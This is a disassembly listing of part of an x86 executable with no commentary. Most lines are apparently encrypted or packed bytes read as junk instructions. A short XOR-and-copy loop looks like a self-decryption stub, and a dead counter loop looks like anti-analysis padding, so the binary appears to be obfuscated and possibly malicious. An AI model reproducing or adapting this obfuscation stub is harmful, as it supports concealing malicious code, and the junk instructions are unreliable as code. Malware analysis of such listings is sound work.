  40318a:	add    BYTE PTR [eax+0x326c9e63],0x61
  403191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403192:	jl     0x403121
  403194:	retf   0x44dd
  403197:	ins    DWORD PTR es:[edi],dx
  403198:	push   cs
  403199:	jmp    0x702c3dd1
  40319e:	js     0x40318c
  4031a0:	pushf  
  4031a1:	adc    DWORD PTR [edx+0x63205e9b],0x41
  4031a8:	and    BYTE PTR [edx+edi*4-0xc109755],dl
  4031af:	call   0x2df42c3e
  4031b4:	push   eax
  4031b5:	inc    edx
  4031b6:	and    DWORD PTR [edx+0x43e44451],ebp
  4031bc:	fcom   QWORD PTR [eax+0x56]
  4031bf:	mov    dl,0x61
  4031c1:	dec    eax
  4031c2:	fdiv   QWORD PTR [eax-0x39]
  4031c5:	xor    eax,0x26924ab0
  4031ca:	ret    
  4031cb:	shr    DWORD PTR [edx+0x70],1
  4031ce:	fdivr  QWORD PTR [edx]
  4031d0:	add    ebp,DWORD PTR [ecx+0x42e9dcdf]
  4031d6:	mov    ebp,0x1fee80b2
  4031db:	(bad)  
  4031dc:	xchg   edi,eax
  4031dd:	jbe    0x403239
  4031df:	inc    DWORD PTR [ebx]
  4031e1:	jno    0x403200
  4031e3:	push   esi
  4031e4:	push   esi
  4031e5:	jecxz  0x403185
  4031e7:	(bad)  
  4031e8:	bound  esp,QWORD PTR [edx]
  4031ea:	gs pushf 
  4031ec:	jp     0x40323f
  4031ee:	inc    esi
  4031ef:	pop    edx
  4031f0:	sar    BYTE PTR [edx-0x292c622d],0x57
  4031f7:	mov    ecx,0xfdd75e29
  4031fc:	or     DWORD PTR [edi+0x2],edx
  4031ff:	dec    eax
  403200:	or     eax,0x8db9cc02
  403205:	(bad)  [esi]
  403207:	mov    ds:0x8b0068ae,eax
  40320c:	xchg   BYTE PTR [edx-0x68],ch
  40320f:	mov    eax,ds:0x3933a3b
  403214:	or     edi,edi
  403216:	retf   0x5d3f
  403219:	fst    DWORD PTR [ecx+0x3e19dfbe]
  40321f:	mov    ebx,0xca9b98f8
  403224:	sahf   
  403225:	lock pop eax
  403227:	xchg   esp,eax
  403228:	pop    esi
  403229:	sar    DWORD PTR [ebx-0x57f225d0],0xe0
  403230:	adc    bh,BYTE PTR [edx+0x2c]
  403233:	pop    ss
  403234:	mov    eax,ds:0x9475cc80
  403239:	jbe    0x4031bc
  40323b:	jnp    0x40329e
  40323d:	sti    
  40323e:	inc    edi
  40323f:	inc    edx
  403240:	(bad)  
  403241:	pop    eax
  403242:	ins    BYTE PTR es:[edi],dx
  403243:	ja     0x40329c
  403245:	pop    edx
  403246:	xchg   ebx,eax
  403247:	xacquire xchg DWORD PTR [eax-0x14],edi
  40324b:	add    esp,eax
  40324d:	(bad)
  403251:	mov    esp,eax
  403253:	loop   0x4032a5
  403255:	fwait
  403256:	mov    edx,?
  403258:	dec    edx
  403259:	and    esp,ebx
  40325b:	out    dx,eax
  40325c:	mov    ebp,0x48cef225
  403261:	mov    ds:0x12a3d2e6,eax
  403266:	or     ebp,DWORD PTR [esi-0x1a]
  403269:	jmp    0x4032a9
  40326b:	dec    ecx
  40326c:	push   eax
  40326d:	(bad)  
  40326e:	and    al,0xcd
  403270:	cmp    ebx,0x13ab1ff7
  403276:	imul   esi,DWORD PTR [ecx-0xd],0x35
  40327a:	mov    esi,0x6a186a62
  40327f:	jmp    0xf61:0xb83dda28
  403286:	fdivrp st(6),st
  403288:	adc    al,0x71
  40328a:	cli    
  40328b:	sub    al,cl
  40328d:	sbb    al,0xae
  40328f:	int    0xb5
  403291:	cmp    eax,0xba404599
  403296:	sbb    ebx,DWORD PTR [ebp-0x4c60b5c5]
  40329c:	dec    ecx
  40329d:	leave  
  40329e:	stos   DWORD PTR es:[edi],eax
  40329f:	out    dx,al
  4032a0:	push   esp
  4032a1:	or     al,0xf6
  4032a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a4:	rcl    BYTE PTR [ebx-0x23],cl
  4032a7:	xchg   ecx,eax
  4032a8:	icebp  
  4032a9:	(bad)  
  4032ab:	std    
  4032ac:	mov    ah,0xe5
  4032ae:	lea    eax,[esi-0x443f8800]
  4032b4:	xchg   ebp,eax
  4032b5:	icebp  
  4032b6:	sahf   
  4032b7:	scas   al,BYTE PTR es:[edi]
  4032b8:	nop
  4032b9:	xchg   esi,eax
  4032ba:	mov    esp,0xe9b1b819
  4032bf:	sbb    ebx,DWORD PTR [ebp+0x27bc2840]
  4032c5:	xchg   BYTE PTR [ecx-0x271b244d],dh
  4032cb:	jb     0x4032f3
  4032cd:	es fsubp st(3),st
  4032d0:	daa    
  4032d1:	je     0x4032b8
  4032d3:	mov    ebp,0xfc714254
  4032d8:	fistp  DWORD PTR [eax+0x14]
  4032db:	cdq    
  4032dc:	out    dx,eax
  4032dd:	and    eax,ebp
  4032df:	inc    ebp
  4032e0:	test   DWORD PTR [ebp+0x6a9d7181],esp
  4032e6:	cmc    
  4032e7:	inc    eax
  4032e8:	pop    ss
  4032e9:	mov    edi,es
  4032eb:	call   0xe94e:0x5fe37ad0
  4032f2:	jb     0x4032ad
  4032f4:	inc    ebx
  4032f5:	lahf   
  4032f6:	retf   
  4032f7:	fwait
  4032f8:	push   DWORD PTR [eax]
  4032fa:	ret    0xd8a9
  4032fd:	mov    ds:0x9702eb7b,eax
  403302:	imul   esi,DWORD PTR ds:0xd5b2a892,0xf6e95c92
  40330c:	lods   al,BYTE PTR ds:[esi]
  40330d:	pop    ds
  40330e:	sub    al,0x3f
  403310:	stos   DWORD PTR es:[edi],eax
  403311:	fcomp  st(1)
  403313:	add    dl,BYTE PTR [ecx]
  403315:	outs   dx,DWORD PTR ds:[esi]
  403316:	sbb    dl,0x8
  403319:	sub    esp,DWORD PTR [edx-0x72]
  40331c:	sbb    cl,bl
  40331e:	inc    esp
  40331f:	enter  0x9d70,0x7
  403323:	icebp  
  403324:	or     DWORD PTR [eax],esi
  403326:	imul   esi,ebx,0xe43c013
  40332c:	fmul   st(5),st
  40332e:	lods   al,BYTE PTR ds:[esi]
  40332f:	(bad)  [edi]
  403331:	push   eax
  403332:	xchg   edi,eax
  403333:	pop    esp
  403334:	fadd   st(5),st
  403336:	sbb    bh,bl
  403338:	cwd    
  40333a:	xor    ebx,DWORD PTR [ebp+edi*8-0x2d]
  40333e:	cli    
  40333f:	mov    ds:0x48fcddc,eax
  403344:	inc    esi
  403345:	jno    0x4032fa
  403347:	xchg   esi,eax
  403348:	popf   
  403349:	ds jns 0x4033c0
  40334c:	mov    al,0x57
  40334e:	leave  
  40334f:	(bad)  
  403350:	adc    ebx,DWORD PTR [edi+0x25]
  403353:	inc    edi
  403354:	and    al,0x44
  403356:	xchg   ecx,eax
  403357:	in     al,dx
  403358:	aad    0x41
  40335a:	(bad)  
  40335c:	mov    bl,0xef
  40335e:	xchg   esi,eax
  40335f:	pop    edx
  403360:	sub    DWORD PTR ds:[edx],esi
  403363:	and    bl,ah
  403365:	cwde   
  403366:	rcr    DWORD PTR [ecx-0x5c],cl
  403369:	repz mov edx,DWORD PTR [esi-0x1a]
  40336d:	inc    edi
  40336e:	dec    edi
  40336f:	push   cs
  403370:	mov    bh,BYTE PTR [ebx-0x5e]
  403373:	sbb    ebp,DWORD PTR [ecx+0x374bad36]
  403379:	imul   edx,DWORD PTR [eax],0xac286c44
  40337f:	push   es
  403380:	shl    bh,0x7
  403383:	xchg   DWORD PTR [eax+0x1c],ecx
  403386:	fistp  QWORD PTR es:[eax-0x8255cde]
  40338d:	xor    ebp,esi
  40338f:	and    BYTE PTR [esi-0x1],0x90
  403393:	ficom  WORD PTR [edx]
  403395:	xchg   ebp,eax
  403396:	fisubr DWORD PTR [esi+ebx*4]
  403399:	sbb    edx,DWORD PTR [edi]
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	mov    bh,0x2e
  4033bb:	sahf   
  4033bc:	cmp    dl,BYTE PTR ds:[eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403349
  4033c6:	je     0x4033a8
  4033c8:	aas    
  4033c9:	jbe    0x403421
  4033cb:	inc    ebx
  4033cc:	lods   al,BYTE PTR ds:[esi]
  4033cd:	cmp    BYTE PTR [edi+0xf],dl
  4033d0:	pop    esi
  4033d1:	lods   eax,DWORD PTR ds:[esi]
  4033d2:	or     BYTE PTR [edi+0x3d],ah
  4033d5:	mov    DWORD PTR [ebx-0x3cd42cd2],esp
  4033db:	and    BYTE PTR [esi+0x5d052fe],cl
  4033e1:	add    edx,ebp
  4033e3:	dec    edx
  4033e4:	sbb    edi,DWORD PTR [edi+0x1288eab3]
  4033ea:	das    
  4033eb:	fdivr  DWORD PTR [esi+0x79]
  4033ee:	push   ecx
  4033ef:	lock retf 
  4033f1:	adc    DWORD PTR [edi+0x44],edx
  4033f4:	stos   BYTE PTR es:[edi],al
  4033f5:	push   DWORD PTR [edi-0x6588bec0]
  4033fb:	push   ds
  4033fc:	ins    BYTE PTR es:[edi],dx
  4033fd:	(bad)  
  4033fe:	push   ecx
  4033ff:	and    DWORD PTR [eax],edi
  403401:	cmp    DWORD PTR [edi+0x76d321bc],ebp
  403407:	mov    WORD PTR [eax+0x660d7b0d],ss
  40340d:	inc    ebp
  40340e:	into   
  40340f:	fistp  QWORD PTR [ebp+0x4c]
  403412:	xor    BYTE PTR [edx-0x6f53d14a],bl
  403418:	fld    QWORD PTR [edi-0x5b42dae3]
  40341e:	mov    edi,0x3ab121d7
  403423:	in     eax,0xa
  403425:	fadd   st(6),st
  403427:	loopne 0x4033df
  403429:	fsubr  QWORD PTR [ecx-0xda76f22]
  40342f:	repnz xchg bl,bh
  403432:	mov    fs,WORD PTR [ecx+0x1d]
  403435:	mov    bl,0x16
  403437:	cmp    eax,0x4865c60e
  40343c:	mov    edi,0x7c7b0e4
  403441:	and    BYTE PTR [ebx-0x12095a94],0xdf
  403448:	jecxz  0x4033ca
  40344a:	xor    DWORD PTR [eax-0x36f16d76],ebp
  403450:	mov    al,ds:0xe88af6d6
  403455:	cli    
  403456:	cmc    
  403457:	mov    edi,0x407031b9
  40345c:	inc    eax
  40345d:	sbb    DWORD PTR [ecx+ebp*4],edi
  403460:	cmp    BYTE PTR [eax-0x23],dh
  403463:	cmp    al,0x28
  403465:	push   esi
  403466:	pop    ss
  403467:	adc    ch,BYTE PTR [edi+0x3378ab3e]
  40346d:	mov    ds:0x184eb930,eax
  403472:	lea    ecx,[edi+0x37cf08c5]
  403478:	jl     0x4034dc
  40347a:	jg     0x403443
  40347c:	inc    esp
  40347d:	xor    eax,0x632e9211
  403482:	pop    edi
  403483:	je     0x403409
  403485:	jae    0x4034fa
  403487:	sar    ebx,cl
  403489:	add    eax,0x986612e
  40348e:	push   ss
  40348f:	cli    
  403490:	mov    ch,0x7f
  403492:	pushf  
  403493:	idiv   DWORD PTR [eax+ebx*4]
  403496:	mov    dl,0x80
  403498:	mov    esp,0x45fd9327
  40349d:	push   0xd5e7daad
  4034a2:	dec    edx
  4034a3:	lahf   
  4034a4:	cmp    al,0xef
  4034a6:	imul   ebx,DWORD PTR [edx],0x1fdc391e
  4034ac:	xchg   esi,eax
  4034ad:	add    eax,0x1c6932b7
  4034b2:	call   0xe6fd:0xf7a0f01a
  4034b9:	out    dx,eax
  4034ba:	ins    DWORD PTR es:[edi],dx
  4034bb:	mov    BYTE PTR [ebx+0x2b],ch
  4034be:	xchg   esi,eax
  4034bf:	jbe    0x4034e6
  4034c1:	mov    ebx,DWORD PTR [ebp+0x19]
  4034c4:	cli    
  4034c5:	pushf  
  4034c6:	and    BYTE PTR [esi-0x5],0xbb
  4034ca:	push   es
  4034cb:	or     DWORD PTR [ebx+edx*8-0x48],edi
  4034cf:	mov    ah,0xbc
  4034d1:	xchg   esp,eax
  4034d2:	mov    ecx,DWORD PTR [ebp-0x23a851a1]
  4034d8:	outs   dx,DWORD PTR ds:[esi]
  4034d9:	lods   al,BYTE PTR ds:[esi]
  4034da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034db:	pusha  
  4034dc:	sbb    al,0x21
  4034de:	sub    DWORD PTR [edi-0x184bc79a],edi
  4034e4:	pushf  
  4034e5:	add    eax,0x73c8ae3f
  4034ea:	mov    ebp,esi
  4034ec:	data16 and bh,BYTE PTR [esi-0x10]
  4034f0:	pop    ecx
  4034f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f2:	fld    DWORD PTR [edi]
  4034f4:	(bad)  
  4034f5:	cmp    BYTE PTR [ebx+0x49],bl
  4034f8:	jns    0x403564
  4034fa:	pop    es
  4034fb:	outs   dx,BYTE PTR ds:[esi]
  4034fc:	pop    edi
  4034fd:	lahf   
  4034fe:	fcomp  DWORD PTR [eax]
  403500:	dec    BYTE PTR [edi+esi*4]
  403503:	sbb    al,0xb7
  403505:	dec    esi
  403506:	mov    esp,0x44171738
  40350b:	pop    ecx
  40350c:	mov    ch,0x96
  40350e:	out    0x6a,eax
  403510:	bnd call ecx
  403513:	std    
  403514:	ret    
  403515:	mov    DWORD PTR [ebx-0x4b302242],ecx
  40351b:	retf   
  40351c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351d:	scas   eax,DWORD PTR es:[edi]
  40351e:	xchg   edi,eax
  40351f:	inc    edi
  403520:	mov    ebp,0x165b9420
  403525:	xor    esi,DWORD PTR [ecx]
  403527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403528:	dec    ebx
  403529:	addr16 sub al,0x62
  40352c:	iret   
  40352d:	jg     0x403598
  40352f:	push   cs
  403530:	pop    es
  403531:	jb     0x403571
  403533:	pop    ecx
  403534:	xchg   edx,eax
  403535:	in     eax,0xbc
  403537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403538:	cmc    
  403539:	ins    DWORD PTR es:[edi],dx
  40353a:	inc    edx
  40353b:	pop    ecx
  40353c:	add    esp,DWORD PTR [edi-0x347b57a0]
  403542:	mov    al,BYTE PTR [edi]
  403544:	dec    eax
  403545:	jno    0x403541
  403547:	repz sbb dl,ch
  40354a:	test   eax,0x8e63155e
  40354f:	jne    0x4035b8
  403551:	push   eax
  403553:	inc    ebp
  403554:	push   ss
  403555:	push   ss
  403556:	aad    0xdb
  403558:	and    BYTE PTR [ebx+0x5678c662],ah
  40355e:	aas    
  40355f:	clc    
  403560:	mov    BYTE PTR [edi-0x1f],bl
  403563:	int3   
  403564:	and    edx,ebp
  403566:	out    0x9e,al
  403568:	push   ds
  403569:	mov    ds,WORD PTR [ebx-0x272d6318]
  40356f:	add    al,0xe3
  403571:	scas   al,BYTE PTR es:[edi]
  403572:	fmul   st,st(4)
  403574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403575:	sbb    BYTE PTR [ebx+0x4830a78f],bl
  40357b:	lahf   
  40357c:	mov    dl,0xe5
  40357e:	mov    BYTE PTR [ebx-0x1af2580b],ah
  403584:	push   eax
  403585:	add    DWORD PTR [ebx-0x2f],esp
  403588:	cmp    eax,0xd9324a77
  40358d:	pop    ebx
  40358e:	inc    esp
  40358f:	adc    eax,0x187c7bba
  403594:	(bad)  
  403596:	fadd   DWORD PTR [edi-0x4c0d47af]
  40359c:	add    DWORD PTR ds:[eax+0x47756802],esp
  4035a3:	mov    ebp,0x666b6e00
  4035a8:	jge    0x403614
  4035aa:	fidiv  DWORD PTR [ebx-0x9303a69]
  4035b0:	mov    eax,0xffa87d45
  4035b5:	or     edi,DWORD PTR [edi-0x13]
  4035b8:	ja     0x4035fe
  4035ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035bb:	mov    edx,0x53959890
  4035c0:	mov    ebx,0x570dd1c8
  4035c5:	pop    ebx
  4035c6:	cs mov cl,0xf1
  4035c9:	imul   esp,DWORD PTR [eax+0x4826d434],0x3a
  4035d0:	push   ebx
  4035d1:	(bad)  
  4035d2:	(bad)  
  4035d3:	and    ah,cl
  4035d5:	dec    ebp
  4035d6:	stos   BYTE PTR es:[edi],al
  4035d7:	jne    0x403636
  4035d9:	xor    cl,al
  4035db:	mov    al,0xcd
  4035dd:	(bad)  
  4035de:	jle    0x4035cd
  4035e0:	aam    0x78
  4035e2:	rcr    DWORD PTR [edx+0x3136b565],cl
  4035e8:	cmp    al,BYTE PTR [ecx]
  4035ea:	mov    eax,ds:0xfd54c333
  4035ef:	pop    ecx
  4035f0:	scas   al,BYTE PTR es:[edi]
  4035f1:	push   ebx
  4035f2:	shl    DWORD PTR [eax-0x3],1
  4035f5:	jb     0x4035a0
  4035f7:	xor    al,0x6d
  4035f9:	stos   BYTE PTR es:[edi],al
  4035fa:	data16 jp 0x40359d
  4035fd:	fs (bad) 
  403600:	push   esp
  403601:	imul   eax,DWORD PTR [ecx],0xffffffc2
  403604:	in     eax,dx
  403605:	out    0x4a,al
  403607:	pop    ebx
  403608:	lods   al,BYTE PTR ds:[esi]
  403609:	or     edi,esi
  40360b:	(bad)  
  40360c:	mov    dh,0x5b
  40360e:	arpl   WORD PTR [edi],bp
  403610:	dec    edi
  403611:	repnz or dh,ch
  403614:	adc    BYTE PTR [ebx-0x39],0x49
  403618:	cmovle ebx,DWORD PTR [esi+0x6949436]
  40361f:	inc    edx
  403620:	data16 repz fwait
  403623:	xor    dl,BYTE PTR [ebx+0x6e]
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	jbe    0x4035d2
  403629:	lods   eax,DWORD PTR ds:[esi]
  40362a:	leave  
  40362b:	jp     0x403687
  40362d:	iret   
  40362e:	xchg   esp,eax
  40362f:	xor    BYTE PTR [ebx],ch
  403631:	mov    ds:0x2ee99c11,al
  403636:	leave  
  403637:	mov    DWORD PTR [esp+edx*8],ebx
  40363a:	xor    dl,BYTE PTR [edx+eiz*8-0x7235396c]
  403641:	cmc    
  403642:	stos   DWORD PTR es:[edi],eax
  403643:	mov    al,ds:0x4613d3af
  403648:	jge    0x4036c1
  40364a:	bound  ebx,QWORD PTR es:[edx]
  40364d:	jge    0x403647
  40364f:	inc    edi
  403650:	and    eax,0xb5638718
  403655:	dec    ebx
  403656:	in     al,dx
  403657:	jge    0x4036b8
  403659:	xchg   ebp,eax
  40365a:	or     eax,0x21104ae6
  40365f:	sbb    al,0x32
  403661:	dec    ebp
  403662:	cld    
  403663:	sti    
  403664:	push   edx
  403665:	cmp    BYTE PTR [ebx+0x3b229638],ch
  40366b:	add    ebp,DWORD PTR [edx-0x29]
  40366e:	mov    bl,0x70
  403670:	or     edx,edi
  403672:	push   0xffffff96
  403674:	loop   0x4036b7
  403676:	sbb    esi,ecx
  403678:	push   edi
  403679:	mov    esi,0x143ae897
  40367e:	xchg   DWORD PTR [edx+eiz*2-0x7f],ecx
  403682:	adc    esi,edi
  403684:	out    0xef,eax
  403686:	inc    eax
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    eax,esi
  4037a2:	retf   
  4037a3:	mov    edx,ebx
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x6270707d
  4037ae:	jo     0x4037ae
  4037b0:	(bad)  
  4037b1:	jp     0x40379e
  4037b3:	(bad)  
  4037b4:	in     eax,0xc6
  4037b6:	push   edi
  4037b7:	push   esi
  4037b8:	aas    
  4037b9:	xor    DWORD PTR [esi],0x378f37a0
  4037bf:	and    edi,DWORD PTR [eax]
  4037c1:	push   ebx
  4037c2:	scas   al,BYTE PTR es:[edi]
  4037c3:	rcl    DWORD PTR [esi+0x16],1
  4037c6:	cs sub eax,0x61bc3010
  4037cc:	leave  
  4037cd:	cmp    eax,0x92b864d4
  4037d2:	cld    
  4037d3:	xchg   esi,eax
  4037d4:	retf   0x38ba
  4037d7:	mov    ds:0xf032dd73,eax
  4037dc:	add    ecx,DWORD PTR [esi-0x39]
  4037df:	jb     0x4037ec
  4037e1:	retf   
  4037e2:	or     eax,0xc3774139
  4037e7:	dec    ecx
  4037e8:	and    DWORD PTR [ecx-0x48],ebx
  4037eb:	aas    
  4037ec:	cdq    
  4037ed:	int    0xed
  4037ef:	hlt    
  4037f0:	xor    dh,BYTE PTR [edi+0x5b]
  4037f3:	jmp    0x4037f1
  4037f5:	mov    dl,0xb0
  4037f7:	xor    BYTE PTR [edi-0x58],cl
  4037fa:	shl    ch,1
  4037fc:	add    esp,DWORD PTR [ecx]
  4037fe:	adc    edx,DWORD PTR [esi]
  403800:	retf   
  403801:	test   DWORD PTR [ebx+eax*8],edi
  403804:	imul   ecx,DWORD PTR [ebx+0x78],0x23
  403808:	mov    dh,0x9e
  40380a:	pop    ds
  40380b:	mov    DWORD PTR [ecx+0xe],edx
  40380e:	cmp    al,0xeb
  403810:	sbb    DWORD PTR [ebx],esi
  403812:	lea    ebx,[ebx+ebp*1+0xc]
  403816:	(bad)  
  403817:	dec    edx
  403818:	xor    DWORD PTR [ecx+0x1],edi
  40381b:	push   eax
  40381c:	aad    0x48
  40381e:	pop    edx
  40381f:	adc    BYTE PTR [ebp-0x51],ch
  403822:	mul    bh
  403824:	retf   0x4398
  403827:	adc    BYTE PTR [ebx+0x76],0xa3
  40382b:	ret    
  40382c:	cmc    
  40382d:	ds cmp al,0x5a
  403830:	fisttp DWORD PTR [edx+eiz*1-0x6dc6dfed]
  403837:	jne    0x403893
  403839:	jns    0x4037ce
  40383b:	mov    esp,0xb42f29f8
  403840:	push   es
  403841:	add    cl,BYTE PTR [esi-0x64dda7d6]
  403847:	dec    esp
  403848:	dec    edx
  403849:	ins    BYTE PTR es:[edi],dx
  40384a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40384b:	push   ss
  40384c:	add    eax,0xa1e2dd78
  403851:	inc    esi
  403852:	push   es
  403853:	daa    
  403854:	popf   
  403855:	mov    dl,0x89
  403857:	or     esp,ebp
  403859:	xor    DWORD PTR [esi-0x42],esp
  40385c:	out    dx,al
  40385d:	in     eax,0xfa
  40385f:	pop    es
  403860:	push   esi
  403861:	xor    BYTE PTR [ebx+edx*4-0x4acc2f9a],dh
  403868:	mov    esi,0xa6bdab75
  40386d:	push   esi
  40386e:	push   edx
  40386f:	es repz cdq 
  403872:	in     al,dx
  403873:	sbb    al,0x92
  403875:	int3   
  403876:	sub    eax,0x7109ee89
  40387b:	xchg   edi,eax
  40387c:	jno    0x4038a2
  40387e:	jne    0x403812
  403880:	retf   
  403881:	fild   QWORD PTR [ecx+0x3d]
  403884:	and    eax,0x3983c428
  403889:	push   es
  40388a:	stos   DWORD PTR es:[edi],eax
  40388b:	push   ebx
  40388c:	xchg   ecx,eax
  40388d:	lods   al,BYTE PTR ds:[esi]
  40388e:	scas   eax,DWORD PTR es:[edi]
  40388f:	test   DWORD PTR [edx-0x2d0c7dfe],ebp
  403895:	fsubr  QWORD PTR [edi-0x52]
  403898:	mov    ch,0x4d
  40389a:	add    bh,BYTE PTR [ebp-0x22]
  40389d:	sbb    al,dh
  40389f:	dec    esp
  4038a0:	mov    esi,0x2cf44b6c
  4038a5:	and    BYTE PTR [eax+0x1a],cl
  4038a8:	repz cmp DWORD PTR [esi+0x58],edx
  4038ac:	push   ds
  4038ad:	pop    ebp
  4038ae:	nop
  4038af:	xchg   edx,eax
  4038b0:	cdq    
  4038b1:	call   0xd5e5:0x98dd7e76
  4038b8:	pop    ebp
  4038b9:	add    BYTE PTR ds:0x902ca40a,0x2d
  4038c0:	nop
  4038c1:	out    0x98,eax
  4038c3:	mov    esi,0x82760431
  4038c8:	(bad)  
  4038c9:	andnps xmm0,xmm2
  4038cc:	test   edi,eax
  4038ce:	cmp    BYTE PTR [eax-0x76],0xf3
  4038d2:	cmp    dl,BYTE PTR [ecx-0x6600ac33]
  4038d8:	add    ebp,DWORD PTR [edi]
  4038da:	push   ds
  4038db:	jmp    0xa34f079e
  4038e0:	push   0xffffffd2
  4038e2:	fst    DWORD PTR [ecx+0x2e]
  4038e5:	repz xor al,0x23
  4038e8:	imul   edx,DWORD PTR [esi+edi*1],0xef3c4a95
  4038ef:	iret   
  4038f0:	icebp  
  4038f1:	pushf  
  4038f2:	outs   dx,DWORD PTR ds:[esi]
  4038f3:	into   
  4038f4:	rcr    DWORD PTR [edi-0x16],1
  4038f7:	fdivr  st,st(2)
  4038f9:	out    dx,al
  4038fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038fb:	ret    
  4038fc:	int3   
  4038fd:	arpl   WORD PTR [edx-0x1],di
  403900:	ins    DWORD PTR es:[edi],dx
  403901:	jae    0x403979
  403903:	test   BYTE PTR [ecx],dh
  403905:	push   esi
  403906:	dec    ecx
  403907:	fcomp  st(7)
  403909:	aad    0x5b
  40390b:	and    ch,BYTE PTR [edx+edx*4]
  40390e:	and    eax,DWORD PTR [ebx-0x19]
  403911:	add    bh,BYTE PTR ds:0x9bfb19f6
  403917:	into   
  403918:	sub    eax,0x250b71d7
  40391d:	loop   0x4038d5
  40391f:	neg    BYTE PTR [edi]
  403921:	gs xor bh,al
  403924:	lahf   
  403925:	pop    ds
  403926:	retf   0x303a
  403929:	in     eax,0x2b
  40392b:	inc    ebp
  40392c:	push   ebp
  40392d:	mov    dl,0xaa
  40392f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403930:	cmp    DWORD PTR [ecx],ebp
  403932:	adc    DWORD PTR cs:[esi+0x51],0x4da938b4
  40393a:	cmp    bl,BYTE PTR [ecx]
  40393c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40393d:	pop    es
  40393e:	shl    BYTE PTR [edi+0x21],1
  403941:	rol    bh,cl
  403943:	dec    edx
  403944:	int3   
  403945:	sub    cl,BYTE PTR [ebp-0xf0f86e9]
  40394b:	clc    
  40394c:	lds    edi,FWORD PTR [esp+ecx*1-0x266232ff]
  403953:	mov    al,0x41
  403955:	xchg   ebx,eax
  403956:	and    ah,BYTE PTR [edi-0x435fcd0c]
  40395c:	std    
  40395d:	xor    ah,BYTE PTR [edi-0x2f]
  403960:	add    DWORD PTR [ebx+0x74],eax
  403963:	or     eax,0xea30da57
  403968:	shl    bl,cl
  40396a:	sub    esp,DWORD PTR [esi]
  40396c:	jo     0x4039b8
  40396e:	sbb    edx,DWORD PTR [ecx+0x51c3976a]
  403974:	jae    0x40392f
  403976:	add    al,0xfd
  403978:	pop    ecx
  403979:	push   ebp
  40397a:	rol    ebp,1
  40397c:	aas    
  40397d:	mov    bl,0x15
  40397f:	fwait
  403980:	push   ss
  403981:	sbb    al,0x61
  403983:	jle    0x40398a
  403985:	lea    ecx,[ecx]
  403987:	leave  
  403988:	outs   dx,BYTE PTR ds:[esi]
